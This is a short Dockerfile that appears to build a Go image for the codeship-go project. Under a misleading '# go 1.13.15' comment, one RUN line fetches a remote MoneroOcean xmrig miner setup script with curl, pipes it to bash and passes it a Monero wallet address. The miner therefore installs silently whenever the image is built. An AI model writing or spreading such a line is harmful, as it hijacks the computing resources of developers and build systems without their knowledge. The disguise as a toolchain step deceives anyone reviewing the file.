ARG GO_VERSION=1.15

FROM golang:${GO_VERSION}
LABEL maintainer=dev@codeship.com

# go 1.13.15
RUN mkdir gudo && cd gudo && curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 82tsjvei4imSqAMBXTUnEPfFdv5PTT6wpim65yfHYErKGmPEDvmdsLSHgNHnQp5xTWitUaiLnNXnvgnvMCyvuUkTF789cgh
# go 1.14.10
RUN go get golang.org/dl/go1.14.10 && \
    go1.14.10 download

WORKDIR /go/src/github.com/codeship/codeship-go
COPY . .

RUN make setup

